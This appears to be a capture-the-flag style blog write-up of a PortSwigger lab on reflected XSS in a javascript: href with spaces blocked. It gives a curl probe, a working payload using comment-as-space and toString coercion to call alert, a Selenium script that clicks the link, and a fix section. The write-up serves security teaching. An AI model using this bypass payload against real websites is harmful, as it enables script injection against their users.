---
layout: post
title: "Reflected XSS in a JavaScript URL with Some Characters Blocked"
date: 2027-06-21 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [xss, reflected-xss, javascript-url, space-bypass, comment-bypass, tostring-coercion, portswigger]
---

## Overview

PortSwigger lab: *Reflected XSS in a JavaScript URL with some characters blocked.*

The application reflects user input inside the body string of an existing `javascript:` href. The filter blocks spaces, but the browser URL-decodes the entire `javascript:` URL before executing it — so URL-encoded characters that the server passes through decode into live JavaScript. The bypass uses `/**/` as a space replacement, then a `toString` coercion chain to fire `alert(1337)` on a single click.

**[CWE-79](https://cwe.mitre.org/data/definitions/79.html)** — Reflected Cross-Site Scripting.

---

## The technique

When a `javascript:` href attribute is built by concatenating user input:

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5'}).finally(_ => window.location = '/')">Back to Blog</a>
```

the browser fully URL-decodes the `javascript:` content before the JS engine runs it. This is a browser-level decode step that runs AFTER the server's response is written — so `%27` in the source becomes `'` in the JavaScript evaluator, `%3E` becomes `>`, and so on.

The server blocks raw spaces but not URL-encoded characters. Replacing each space with `/**/` (a JavaScript block comment that the parser treats as whitespace) sidesteps the filter entirely.

---

## Recon

Before sending the full payload, confirm the injection surface with a single-quote probe (`%27`):

```bash
curl -s --globoff 'https://<lab-id>.web-security-academy.net/post?postId=5&%27' \
  | grep -o 'javascript:[^"]*'
```

If the output shows `'` appearing **unescaped** inside the `javascript:` href (not as `%27` or `&#x27;`), the browser's URL-decode step is active:

```
javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5&'}).finally(...)
```

The raw `'` after `&` confirms that `%27` URL-encodes through the server and decodes in the browser — the injection surface is live.

## Solution

**Inject URL:** navigate to the page with the following query string (URL-encoded so the server passes it):

```
/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

The server reflects this into the `href` attribute. After the browser URL-decodes the `javascript:` URL, the JS engine evaluates:

```javascript
fetch('/analytics', {method:'post',body:'/post?postId=5&'},
  x=x=>{throw/**/onerror=alert,1337},
  toString=x,
  window+'',
  {x:''}).finally(_ => window.location = '/')
```

Then click **Back to Blog** to execute the `javascript:` href.

Use Selenium to automate the click in a headless browser:

```python
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

url = ("https://<lab-id>.web-security-academy.net/post?postId=5"
       "&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27")

opts = Options()
for a in ["--headless=new", "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]:
    opts.add_argument(a)

driver = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=opts)
try:
    driver.get(url)
    time.sleep(2)
    links = driver.find_elements(By.PARTIAL_LINK_TEXT, "Back to Blog")
    if links:
        links[0].click()
        time.sleep(2)
    alert = driver.switch_to.alert
    print("ALERT FIRED:", alert.text)   # Uncaught 1337
    alert.accept()
finally:
    driver.quit()
```

Alert fires: `Uncaught 1337` → lab solved.

---

## Why it worked

The payload decoded injection is: `'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`

Each element does one job:

| Fragment | Effect |
|---|---|
| `'` | Closes the `body:` string value |
| `}` | Closes the fetch options object |
| `x=x=>{throw/**/onerror=alert,1337}` | Arrow fn; `/**/` = space bypass; comma-expr sets `onerror=alert` then throws `1337` |
| `toString=x` | Overrides `window.toString` |
| `window+''` | Forces string coercion → calls `window.toString()` = `x()` → `onerror(1337)` = `alert(1337)` |
| `,{x:'` | Opens new object; original closing `'` from template closes this cleanly |

The execution never uses an event attribute or tag — it fires entirely inside the existing `javascript:` URL expression via the overridden `toString`.

---

## Fix

Never build `javascript:` hrefs by concatenating user input. Use a `data-*` attribute with a safe JS event listener instead:

```html
<!-- dangerous: user input inside javascript: href -->
<a href="javascript:fetch('/analytics',{body:'/post?PATH'})...">Back to Blog</a>

<!-- safe: user data in a data-* attribute, behaviour in a listener -->
<a href="/" data-path="/post?<ENCODED_PATH>" class="back-btn">Back to Blog</a>
<script>
document.querySelector('.back-btn').addEventListener('click', e => {
  e.preventDefault();
  fetch('/analytics', { method: 'post', body: e.target.dataset.path })
    .finally(_ => location = '/');
});
</script>
```

If a `javascript:` href is unavoidable, apply strict JavaScript-context encoding for every character with JS meaning (`'`, `"`, `` ` ``, `>`, `=`, `+`, `{`, `}`) before inserting user data — not just raw space or angle-bracket filtering.
